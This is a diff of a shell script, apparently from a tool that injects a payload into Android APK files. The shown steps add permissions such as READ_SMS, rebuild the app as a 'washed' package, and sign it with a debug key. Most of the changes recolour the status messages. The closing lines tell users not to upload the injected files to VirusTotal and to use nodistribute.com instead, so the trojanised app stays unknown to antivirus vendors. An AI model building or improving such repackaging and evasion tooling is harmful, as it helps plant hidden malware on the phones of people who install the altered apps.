@@ -59,13 +59,13 @@ sed -i '/READ_SMS/a<uses-permission android:name="android.permission.SET_WALLPAP
 #Rebuild the package using APKTool
 java -jar $JAR b /tmp/payload
 echo; 
-echo "Washed package created: `pwd`/washed_"$APK
-echo "Moving package to the current directory"
+echo -e "\033[34m Washed package created: `pwd`/washed_$originalApk \x1B[0m"
+echo -e "\033[34m Moving the injected package to the current directory \x1B[0m"
 mv /tmp/payload/dist/$APK washed_$APK
 echo
 
 #Signing the package
-echo "Checking for ~/.android/debug.keystore for signing"
+echo -e "\033[34m Checking for ~/.android/debug.keystore for signing \x1B[0m"
 if [ ! -f ~/.android/debug.keystore ]; then
     echo
     echo "Debug key not found. Generating one now."
@@ -79,12 +79,13 @@ echo;
 echo "Attempting to sign the package with your andrid debug key"
 jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA washed_$APK androiddebugkey
 echo
-echo "Signed the .apk file with ~/.android/debug.keystore"
-echo "Simply remove the debug.keystore file and re-run the program to be prompted to create a new debug key"
+echo -e "\033[34m Signed the .apk file with ~/.android/debug.keystore \x1B[0m"
+echo -e "\033[34m Simply remove the debug.keystore file and re-run the program to be prompted to create a new debug key \x1B[0m"
 echo
-echo "Cleaning up"
+echo -e "\033[34m Cleaning up \x1B[0m"
 rm -rf /tmp/payload
-echo "Finished"
 echo
-echo "Enjoy! Please do not upload the washed files to VirusTotal.com."
-echo "Use nodistribute.com instead"
+echo -e "\033[32m Finished! \x1B[0m"
+echo
+echo -e "\033[36m Please do not upload the washed/injected files to VirusTotal.com. \x1B[0m"
+echo -e "\033[36m Use nodistribute.com, or manual scanning on a device. \x1B[0m"
